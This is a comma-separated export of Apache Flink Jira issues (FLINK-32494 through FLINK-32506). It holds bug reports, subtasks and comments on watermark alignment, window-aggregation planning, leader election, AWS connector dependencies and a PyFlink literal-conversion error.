<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,mason6345,mason6345,30/Jun/23 18:02,17/Aug/23 23:41,04/Jun/24 20:41,17/Aug/23 23:41,,,,,,,,,,,,,,,,,,,,,Connectors / Kafka,,,,0,,,,SinkWriterMetricGroup metrics that KafkaSink implements are not documented,,,,,,,,,,,,,,,,,,,,FLINK-30932,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Aug 17 23:41:37 UTC 2023,,,,,,,,,,"0|z1iwow:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"04/Jul/23 08:49;martijnvisser;Is this a duplicate of https://issues.apache.org/jira/browse/FLINK-30932 ?;;;","17/Aug/23 23:41;mason6345;Yes it is, closed and marked as dup;;;",,,,,,,,,,,,,,,,,,,,,
Add the watermark aggregation benchmark for source coordinator,FLINK-32506,13542133,13542368,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,fanrui,fanrui,fanrui,30/Jun/23 16:22,05/Jul/23 02:11,04/Jun/24 20:41,05/Jul/23 02:11,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Connectors / Common,,,,0,pull-request-available,,,"FLINK-32420 is improving the watermark aggregation performance.

We want to add a benchmark for it first, and then we can see the official performance change.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 04 05:14:44 UTC 2023,,,,,,,,,,"0|z1iwnc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"04/Jul/23 05:14;fanrui;Merged via:
<master: 1.18> b402108f9bc468ed5223a5d73ea0bfcfa0085cfe

<benchmark: master> 902d93c4af148fb264ef134e290c9e059e090d1f

 ;;;",,,,,,,,,,,,,,,,,,,,,,
Compilation error in ProducerMergedPartitionFileWriter,FLINK-32505,13542124,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,,mapohl,mapohl,30/Jun/23 15:43,01/Jul/23 00:08,04/Jun/24 20:41,30/Jun/23 16:10,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Network,,,,0,pull-request-available,,,Caused by FLINK-31644 and the flink-shaded upgrade,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Jul 01 00:08:13 UTC 2023,,,,,,,,,,"0|z1iwlc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/Jun/23 16:10;mapohl;master: c1740861727d2614f9bbf154bcdd274d7990e133;;;","01/Jul/23 00:08;tanyuxin;[~mapohl] Thanks for the fix.;;;",,,,,,,,,,,,,,,,,,,,,
DefaultLeaderElectionService#running field can be removed,FLINK-32504,13542120,13542119,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Won't Fix,,mapohl,mapohl,30/Jun/23 15:01,06/Jul/23 19:09,04/Jun/24 20:41,06/Jul/23 19:09,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Coordination,,,,0,,,,The running property of {{DefaultLeaderElectionService}} can be removed. The same functionality can be reflected through {{leaderElectionDriver != null && !leadershipOperationExecutor.isShutdown()}},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jul 06 19:09:33 UTC 2023,,,,,,,,,,"0|z1iwkg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jul/23 19:09;mapohl;The changes made in FLINK-31837 made the {{running}} field being necessary again. ;;;",,,,,,,,,,,,,,,,,,,,,,
FLIP-285 technical debt,FLINK-32503,13542119,,Technical Debt,In Progress,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,mapohl,mapohl,mapohl,30/Jun/23 14:59,30/Jun/23 17:52,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Coordination,,,,0,,,,This Jira issue collects any technical debt related to the FLIP-285 efforts that were introduced with FLINK-26522,,,,,,,,,,,,,,,,,,,,,FLINK-26522,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-30 14:59:10.0,,,,,,,,,,"0|z1iwk8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove AbstractLeaderElectionService,FLINK-32502,13542118,13542119,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Wencong Liu,mapohl,mapohl,30/Jun/23 14:58,07/Jul/23 13:26,04/Jun/24 20:41,07/Jul/23 13:26,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,starter,,{{AbstractLeaderElectionService}} doesn't bring much value anymore and can be removed.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 07 13:26:01 UTC 2023,,,,,,,,,,"0|z1iwk0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jul/23 01:42;Wencong Liu;Hello [~mapohl]  Are you suggesting merging the methods of AbstractLeaderElectionService to the LeaderElectionService interface? I would like to address this issue. 😄;;;","06/Jul/23 06:29;mapohl;No, I'm suggesting merging the {{DefaultLeaderElectionService}} and the {{AbstractLeaderElectionService}}. There is no reason to have the abstract class (, anymore). Thanks for volunteering. I'm gonna assign the ticket to you. :-);;;","07/Jul/23 13:26;mapohl;master: d88ef0e355bdd90b6cc3f867539d78e82eb5edea;;;",,,,,,,,,,,,,,,,,,,,
Wrong execution plan of a proctime window aggregation generated due to incorrect cost evaluation,FLINK-32501,13542093,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,lincoln.86xy,lincoln.86xy,lincoln.86xy,30/Jun/23 12:28,11/Jul/23 15:58,04/Jun/24 20:41,06/Jul/23 09:47,1.16.2,1.17.1,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,"Currently when uses window aggregation referring a windowing tvf with a filter condition, may encounter wrong plan which may hang forever in runtime(the window aggregate operator never output)

for such a case:
{code}
insert into sink
    select
        window_start,
        window_end,
        b,
        COALESCE(sum(case
            when a = 11
            then 1
        end), 0) c
    from
        TABLE(
            TUMBLE(TABLE source, DESCRIPTOR(proctime), INTERVAL '10' SECONDS)
        )
    where
        a in (1, 5, 7, 9, 11)
    GROUP BY
        window_start, window_end, b
{code}

generate wrong plan which didn't combine the proctime WindowTableFunction into WindowAggregate (so when translate to execution plan the WindowAggregate will wrongly recognize the window as an event-time window, then the WindowAggregateOperator will not receive watermark nor setup timers to fire any windows in runtime)
{code}
Sink(table=[default_catalog.default_database.sink], fields=[ws, we, b, c])
+- Calc(select=[CAST(window_start AS TIMESTAMP(6)) AS ws, CAST(window_end AS TIMESTAMP(6)) AS we, b, CAST(COALESCE($f1, 0) AS BIGINT) AS c])
   +- WindowAggregate(groupBy=[b], window=[TUMBLE(win_start=[window_start], win_end=[window_end], size=[10 s])], select=[b, SUM($f3) AS $f1, start('w$) AS window_start, end('w$) AS window_end])
      +- Exchange(distribution=[hash[b]])
         +- Calc(select=[window_start, window_end, b, CASE((a = 11), 1, null:INTEGER) AS $f3], where=[SEARCH(a, Sarg[1, 5, 7, 9, 11])])
            +- WindowTableFunction(window=[TUMBLE(time_col=[proctime], size=[10 s])])
               +- Calc(select=[a, b, PROCTIME() AS proctime])
                  +- TableSourceScan(table=[[default_catalog, default_database, source, project=[a, b], metadata=[]]], fields=[a, b])
{code}

expected plan:
{code}
Sink(table=[default_catalog.default_database.sink], fields=[ws, we, b, c])
+- Calc(select=[CAST(window_start AS TIMESTAMP(6)) AS ws, CAST(window_end AS TIMESTAMP(6)) AS we, b, CAST(COALESCE($f1, 0) AS BIGINT) AS c])
   +- WindowAggregate(groupBy=[b], window=[TUMBLE(time_col=[proctime], size=[10 s])], select=[b, SUM($f3) AS $f1, start('w$) AS window_start, end('w$) AS window_end])
      +- Exchange(distribution=[hash[b]])
         +- Calc(select=[b, CASE((a = 11), 1, null:INTEGER) AS $f3, PROCTIME() AS proctime], where=[SEARCH(a, Sarg[1, 5, 7, 9, 11])])
            +- TableSourceScan(table=[[default_catalog, default_database, source, project=[a, b], metadata=[]]], fields=[a, b])
{code}


",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jul 06 09:47:25 UTC 2023,,,,,,,,,,"0|z1iweg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jul/23 09:47;lincoln.86xy;fixed in master: 1fc3b3746b60ad1636f77fd102444ebaa03bdc3f;;;",,,,,,,,,,,,,,,,,,,,,,
Update dependency versions for AWS connectors package,FLINK-32500,13542083,,Technical Debt,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,a.pilipenko,a.pilipenko,a.pilipenko,30/Jun/23 10:55,30/Jun/23 12:25,04/Jun/24 20:41,30/Jun/23 12:25,aws-connector-4.1.0,,,,,,,,,,,,,,aws-connector-4.2.0,,,,,,Connectors / AWS,,,,0,pull-request-available,,,"Update dependencies:
 * snappy-java from 1.1.8.3 to 1.1.10.1
 * guava from 29.0-jre to 32.0.0-jre",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 30 12:25:50 UTC 2023,,,,,,,,,,"0|z1iwc8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/Jun/23 12:25;dannycranmer;Merged commit [{{9983073}}|https://github.com/apache/flink-connector-aws/commit/99830730ad99a076df4051704cbfc718691a8daa] into apache:main;;;",,,,,,,,,,,,,,,,,,,,,,
Removing dependency of flink-connector-aws on a specific flink-shaded version,FLINK-32499,13542070,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,liangtl,liangtl,30/Jun/23 09:33,30/Jun/23 09:59,04/Jun/24 20:41,30/Jun/23 09:59,,,,,,,,,,,,,,,,,,,,,Connectors / AWS,,,,0,,,,"We want to improve build compatibility of the `flink-connector-aws` repo on upgrading Flink versions. 

If there are changes in the `flink-shaded` in Flink, we can see broken builds due to upgraded shaded versions (e.g. Guava).

We want to explicitly state the version of dependencies being used to prevent this.

 

 

See https://issues.apache.org/jira/browse/FLINK-32462",,,,,,,,,,,,,,,,,,,,FLINK-32208,,,,,,FLINK-32462,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-30 09:33:11.0,,,,,,,,,,"0|z1iw9c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
array_max return type should always nullable,FLINK-32498,13542066,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,jackylau,jackylau,jackylau,30/Jun/23 09:15,04/Jul/23 08:44,04/Jun/24 20:41,04/Jul/23 08:38,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,,,,,0,pull-request-available,,,,,,,,,,,,,,,,FLINK-32257,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 04 08:44:09 UTC 2023,,,,,,,,,,"0|z1iw8g:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/Jun/23 09:19;jackylau;talk it here https://issues.apache.org/jira/browse/FLINK-32257

i will fix it;;;","30/Jun/23 10:00;jackylau;hi [~dwysakowicz] , pr has submitted and  the important part i add comments, it will be convenient for review.;;;","04/Jul/23 08:38;dwysakowicz;Fixed in f3eb364ef15f54a74776004e8c1535d7ff569080;;;","04/Jul/23 08:44;jackylau;hi [~dwysakowicz] thanks for your review very much, do you also have time to review this https://github.com/apache/flink/pull/22250?;;;",,,,,,,,,,,,,,,,,,,
"IF FUNCTION is FALSE and the false_value parameter is a function, then an exception will be thrown",FLINK-32497,13542043,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,,jarieshan,jarieshan,30/Jun/23 07:13,05/Mar/24 06:41,04/Jun/24 20:41,05/Mar/24 06:40,1.17.1,,,,,,,,,,,,,,1.16.3,1.17.2,,,,,Table SQL / API,Table SQL / Client,,,0,,,,"It is successful to execute certain functions individually.
{code:java}
SELECT SPLIT_INDEX('TEST:ABC', ':', 0); {code}
!image-2023-06-30-15-02-57-082.png|width=189,height=36!

 

And it is also successful for these functions to be located in the true_value parameter of the {color:#172b4d}+IF function+{color}.
{code:java}
SELECT IF(2>1, SPLIT_INDEX('TEST:ABC', ':', 1), 'FALSE'); {code}
!image-2023-06-30-15-02-13-197.png|width=185,height=36!

 

Only when these functions are located in the false_value parameter of the {+}IF function{+}, an exception will be thrown.

 func1.
{code:java}
SELECT IF(2>1, 'TRUE', SPLIT_INDEX('TEST:ABC', ':', 0)); {code}
{color:#172b4d}!image-2023-06-30-15-09-44-623.png|width=385,height=42!{color}

func2. 
{code:java}
SELECT IF(2>1, 'TRUE', LOWER('TEST')); {code}
!image-2023-06-30-15-14-21-038.png|width=337,height=246!
 
{color:#172b4d}And it is also successful for{color} +CASE function+
{code:java}
SELECT CASE WHEN 2=1 THEN 'TRUE' ELSE SPLIT_INDEX('TEST:ABC', ':', 0) END; {code}
{color:#172b4d}!image-2023-06-30-15-10-08-619.png|width=188,height=41!{color}","{color:#172b4d}----- Flink Version -----{color}
{color:#172b4d}V{color}{color:#172b4d}ersion: 1.17.1, Commit ID: 2750d5c{color}
 
{color:#172b4d}----- Java Version -----{color}

{color:#172b4d}java version ""1.8.0_202""{color}
{color:#172b4d}Java(TM) SE Runtime Environment (build 1.8.0_202-b08){color}
{color:#172b4d}Java HotSpot(TM) 64-Bit Server VM (build 25.202-b08, mixed mode){color}
 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/23 07:12;jarieshan;flink-1.17.1_logs_jarieshan_20230630.tgz;https://issues.apache.org/jira/secure/attachment/13060989/flink-1.17.1_logs_jarieshan_20230630.tgz","30/Jun/23 07:02;jarieshan;image-2023-06-30-15-02-13-197.png;https://issues.apache.org/jira/secure/attachment/13060995/image-2023-06-30-15-02-13-197.png","30/Jun/23 07:02;jarieshan;image-2023-06-30-15-02-26-099.png;https://issues.apache.org/jira/secure/attachment/13060994/image-2023-06-30-15-02-26-099.png","30/Jun/23 07:02;jarieshan;image-2023-06-30-15-02-57-082.png;https://issues.apache.org/jira/secure/attachment/13060993/image-2023-06-30-15-02-57-082.png","30/Jun/23 07:07;jarieshan;image-2023-06-30-15-07-08-588.png;https://issues.apache.org/jira/secure/attachment/13060992/image-2023-06-30-15-07-08-588.png","30/Jun/23 07:09;jarieshan;image-2023-06-30-15-09-44-623.png;https://issues.apache.org/jira/secure/attachment/13060991/image-2023-06-30-15-09-44-623.png","30/Jun/23 07:10;jarieshan;image-2023-06-30-15-10-08-619.png;https://issues.apache.org/jira/secure/attachment/13060990/image-2023-06-30-15-10-08-619.png","30/Jun/23 07:13;jarieshan;image-2023-06-30-15-13-56-625.png;https://issues.apache.org/jira/secure/attachment/13060997/image-2023-06-30-15-13-56-625.png","30/Jun/23 07:14;jarieshan;image-2023-06-30-15-14-21-038.png;https://issues.apache.org/jira/secure/attachment/13060996/image-2023-06-30-15-14-21-038.png",,,,,,,,,,9.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Mar 05 06:41:52 UTC 2024,,,,,,,,,,"0|z1iw3c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"03/Jul/23 12:01;Sergey Nuyanzin;I checked it with 1.17 and master branch and it is not reproduced

i guess it was fixed within FLINK-30966

[~jarieshan] could you please double check whether it works with latest available 1.17/master?;;;","03/Jul/23 12:15;jarieshan;Apache Flink 1.17.1 latest stable release.

filename: flink-1.17.1-bin-scala_2.12.tgz
MD5:a40302ef77e767da7bf6dbb6420c2e55
https://www.apache.org/dyn/closer.lua/flink/flink-1.17.1/flink-1.17.1-bin-scala_2.12.tgz;;;","03/Jul/23 12:19;Sergey Nuyanzin;it's clear that this is an issue for 1.17.1
i was talking about 1.17.2-SNAPSHOT where FLINK-30966 was applied;;;","04/Mar/24 12:55;davidradl;I notice this is a critical issue. But from reading [~Sergey Nuyanzin]'s comments, it looks like this issue is a duplicate of FLINK-30966 which is fixed in 1.16.3 and 1.17.2.

[~jarieshan]  Could you confirm your problem is fixed and close out this issue please.  ;;;","05/Mar/24 06:41;jarieshan;Thanks, I have closed this issue.;;;",,,,,,,,,,,,,,,,,,
Sources with idleness and alignment always wait for alignment when part of multiple sources is idle,FLINK-32496,13542031,13542635,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,fanrui,haishui,haishui,30/Jun/23 05:46,08/Jul/23 03:35,04/Jun/24 20:41,08/Jul/23 03:35,1.16.2,1.17.1,,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,API / DataStream,,,,0,pull-request-available,,,"Sources with idleness and alignment always wait for alignment when part of multiple sources is idle.

*Root cause:*

In [SourceOperator|https://github.com/apache/flink/blob/master/flink-streaming-java/src/main/java/org/apache/flink/streaming/api/operators/SourceOperator.java], `lastEmittedWatermark` is Long.MAX_VALUE if a source is idle.

When other source is active, the `currentMaxDesiredWatermark` is less then Long.MAX_VALUE.

So the `shouldWaitForAlignment` method is always true for idle sources.

 

What's more, the source will become idle if a source wait for alignment for a long time, which also should be considered.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 07 17:59:47 UTC 2023,,,,,,,,,,"0|z1iw0o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/Jun/23 05:50;haishui;A source will be marked idle if the source waits for alignment for a long time. Is this a bug?;;;","30/Jun/23 06:47;martijnvisser;[~haishui] I believe this is a duplicate of https://issues.apache.org/jira/browse/FLINK-31632;;;","30/Jun/23 06:58;fanrui;Thanks [~haishui]  creating this JIRA.

Hi [~martijnvisser] , after analysis, I think these 2 tickets are not duplicate.

This ticket is a new bug, and it is the root cause of this mail list :  [https://lists.apache.org/thread/znbhls5cdw2o1jl7gl1t1nvsqkgjps5r]

After my test and analysis, I found the bug is when one source is always active and other sources are idle(Either there is no data, or alignment causes idle.), these source won't resume.

 ;;;","30/Jun/23 07:02;haishui;[~martijnvisser] I'm sorry to say that I didn't find this bug when I fix FLINK-31632, even though mas-chen used to mention this issue in PR [[FLINK-31632] Fix maxAllowedWatermark arithmetic overflow when the source is idle by haishui126 · Pull Request #22291 · apache/flink (github.com)|https://github.com/apache/flink/pull/22291]{*}{*};;;","30/Jun/23 07:17;fanrui;Hi [~haishui] , would you mind I fix this bug? ;;;","30/Jun/23 07:32;haishui;[~fanrui] Of course not. Thanks you!;;;","30/Jun/23 07:57;martijnvisser;Thanks for checking and following up! ;;;","30/Jun/23 17:46;mason6345;Hi [~haishui] [~fanrui]! I was looking at the user thread too earlier but got distracted by internal issues. I can help review! ;;;","30/Jun/23 17:55;fanrui;Thanks [~haishui]  and [~mason6345] ,  I will finish it asap.:);;;","01/Jul/23 06:27;fanrui;Add more background here.
h2. What is the purpose of the change

When one source is always active and other sources are idle (Either there is no data, or alignment causes idle.), these source won't resume.

For example, sourceA is always active, sourceB is idle due to there is no data. SourceB won't resume forever even if it can read more data.
h3. Root cause
 * Step1: When source is idle, [WatermarkToDataOutput will update|https://github.com/apache/flink/blob/c1740861727d2614f9bbf154bcdd274d7990e133/flink-streaming-java/src/main/java/org/apache/flink/streaming/api/operators/source/WatermarkToDataOutput.java#L95C12-L95C12] the {{Long.MAX_VALUE}} to [{{SourceOperator#lastEmittedWatermark}}|https://github.com/apache/flink/blob/c1740861727d2614f9bbf154bcdd274d7990e133/flink-streaming-java/src/main/java/org/apache/flink/streaming/api/operators/SourceOperator.java#L605] as the watermark.
 * Step2: [{{SourceOperator#shouldWaitForAlignment}}|https://github.com/apache/flink/blob/c1740861727d2614f9bbf154bcdd274d7990e133/flink-streaming-java/src/main/java/org/apache/flink/streaming/api/operators/SourceOperator.java#L678] is {{{}currentMaxDesiredWatermark < lastEmittedWatermark{}}}, the {{lastEmittedWatermark}} is updated to {{Long.MAX_VALUE}} and the {{currentMaxDesiredWatermark}} is normal due to one source is active. So {{shouldWaitForAlignment}} will be always true.
 * Step3: {{SourceOperator#updateCurrentEffectiveWatermark}} -> {{checkWatermarkAlignment()}} -> {{shouldWaitForAlignment()}} will update the {{operatingMode}} to {{OperatingMode.WAITING_FOR_ALIGNMENT;}}

h3. Bug 👻👻👻
 * Bug1: Actually, it shouldn't be updated to WAITING_FOR_ALIGNMENT. It's updated, because the {{lastEmittedWatermark}} isn't the real watermark. It's very big due to idle.
 * Bug2: The source operatingMode cannot convert from {{WAITING_FOR_ALIGNMENT}} to {{READING}} at {{checkWatermarkAlignment}} forever. Because {{shouldWaitForAlignment}} is always true.

h2. Brief change log

The idle shouldn't update {{SourceOperator#lastEmittedWatermark}} and shouldn't effect the {{shouldWaitForAlignment()}} logic.

I introduced the {{{}SourceOperator#isIdle{}}}, when it's true, {{emitLatestWatermark}} will send the {{Watermark.MAX_WATERMARK}} to the SourceCoordinator. It won't effect the alignment logic at SourceOperator side.;;;","01/Jul/23 07:23;fanrui;{quote}A source will be marked idle if the source waits for alignment for a long time. Is this a bug?
{quote}
Hi [~haishui] , from the current code, this's expected. Idle or Not Idle is a general mechanism: when a source does not update the watermark for more than idleTimeout due to any reason, it will be considered as idle. Of course, the case of watermark alignment is also included.

However watermark alignment is a special case. If we find that watermark alignment causes source idle to cause some behavioral bugs. Then we may need to rethink whether it should not be marked as idle during watermark alignment? Of course , we need to see if there are other solutions for this kind of bug.

WDYT?;;;","02/Jul/23 05:28;haishui;Hi [~fanrui], I have not yet found that this idle issue leads to other issues. In my previous understanding, idle was meant to prevent channels without data from blocking the increase of the watermark, while the watermark from idle channel can be involved in the calculation of the downstream watermark when idle is caused by alignment, which is why I have the question of whether this is a bug or not. ;;;","07/Jul/23 17:59;fanrui;Thanks for the reporting and review, merged via
<master 1.18> : 0e69a7b7d7684be4fe797ad4ff2d203f7da3f577
1.17 : 839b18ea9271b9828ab7890da98b9ff2a18f371f
1.16 : 9e8cfa2ca90f377cf3f809b7d68ce8c2ded7ced7;;;",,,,,,,,,,
SourceCoordinatorAlignmentTest.testWatermarkAlignmentWithTwoGroups fails,FLINK-32495,13542025,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,fanrui,fanrui,fanrui,30/Jun/23 02:57,30/Jun/23 12:15,04/Jun/24 20:41,30/Jun/23 12:15,,,,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Connectors / Common,,,,0,pull-request-available,,,"SourceCoordinatorAlignmentTest.testWatermarkAlignmentWithTwoGroups fails.

I analyzed this CI :  [https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50668&view=logs&j=a57e0635-3fad-5b08-57c7-a4142d7d6fa9&t=2ef0effc-1da1-50e5-c2bd-aab434b1c5b7&l=9089]
h1. Root cause:
 * The CoordinatorExecutorThreadFactory cannot new multiple threads. And too many callers will check `coordinatorThreadFactory.isCurrentThreadCoordinatorThread()`, such as: SourceCoordinatorContext.attemptReady.
 * The CoordinatorExecutorThreadFactory is shared at [SourceCoordinatorTestBase|https://github.com/apache/flink/blob/21eba4ca4cb235a2189c94cdbf3abcec5cde1e6e/flink-runtime/src/test/java/org/apache/flink/runtime/source/coordinator/SourceCoordinatorTestBase.java#L68]
 * It will be used at multiple source coordinator, and the second source coordinator will overwrite the CoordinatorExecutorThreadFactory#t, so the check will fail for the first source.

h1. Solution:

Don't share the CoordinatorExecutorThreadFactory.
h1. log:

!image-2023-06-30-10-53-50-280.png!

 

 ",,,,,,,,,,,,,,,,,,,,,FLINK-32478,,,,,,,,,,,"30/Jun/23 02:53;fanrui;image-2023-06-30-10-53-50-280.png;https://issues.apache.org/jira/secure/attachment/13060986/image-2023-06-30-10-53-50-280.png","30/Jun/23 05:01;fanrui;image-2023-06-30-13-01-26-519.png;https://issues.apache.org/jira/secure/attachment/13060987/image-2023-06-30-13-01-26-519.png","30/Jun/23 05:02;fanrui;image-2023-06-30-13-02-32-803.png;https://issues.apache.org/jira/secure/attachment/13060988/image-2023-06-30-13-02-32-803.png",,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 30 12:15:29 UTC 2023,,,,,,,,,,"0|z1ivzc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/Jun/23 05:02;fanrui;Add a RepeatedTest(500) annotation for  SourceCoordinatorAlignmentTest#testWatermarkAlignmentWithTwoGroups on my Local.

Master branch: Tests failed: 234, passed 266 of 500 test.

Master with this fix: Tests passed 500 of 500 test.

 

!image-2023-06-30-13-01-26-519.png|width=1139,height=256!

!image-2023-06-30-13-02-32-803.png|width=1111,height=245!;;;","30/Jun/23 10:55;fanrui;Merged

<master:1.18> 24e479571facd07ff129c57cda86c7e34d4637bd to 9d7b1663296ef6f85572314a2b26a716981d8bff

1.17 b4e02ab2a27ed8621f0fa0c759b2f58f14d770d4

1.16 403c74d1de01c075aafe824e8f7f8428e477992f;;;","30/Jun/23 12:15;martijnvisser;Thanks [~fanrui] - Also closing FLINK-32478;;;",,,,,,,,,,,,,,,,,,,,
Cannot convert list literal to Table with PyFlink,FLINK-32494,13542020,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,yunfengzhou,yunfengzhou,30/Jun/23 01:44,30/Jun/23 01:46,04/Jun/24 20:41,,1.16.1,,,,,,,,,,,,,,,,,,,,API / Python,,,,0,,,,"During my attempt to convert a list or array to a PyFlink Table using the following program

{code:python}
from pyflink.datastream import StreamExecutionEnvironment
from pyflink.java_gateway import get_gateway
from pyflink.table import (
    expressions as native_flink_expr,
    StreamTableEnvironment,
)
from pyflink.table.types import DataTypes

if __name__ == ""__main__"":
    env = StreamExecutionEnvironment.get_execution_environment()
    t_env = StreamTableEnvironment.create(env)
    table = t_env.from_elements([(1, ), (2, ), (3, )])
    # table = table.add_or_replace_columns(
    #     native_flink_expr.lit([], DataTypes.ARRAY(DataTypes.INT()).not_null())
    # )
    table = table.add_or_replace_columns(
        native_flink_expr.lit(get_gateway().new_array(get_gateway().jvm.java.lang.Integer, 0))
    )
    table.execute().print()
{code}

The following exception would be thrown
{code}
ClassCastException: [Ljava.lang.Integer; cannot be cast to java.util.List
{code}

If I use the following code to create the literal expression along with the program above
{code:python}
table = table.add_or_replace_columns(
    native_flink_expr.lit([], DataTypes.ARRAY(DataTypes.INT()).not_null())
)
{code}

The following exception would be thrown
{code}
Data type 'ARRAY<INT> NOT NULL' with conversion class '[Ljava.lang.Integer;' does not support a value literal of class 'java.util.ArrayList'.
{code}

As PyFlink does not provide a document explaining how to create Table with list literals, and my attempts described above both fail, there might be some bug in PyFlink with this function.


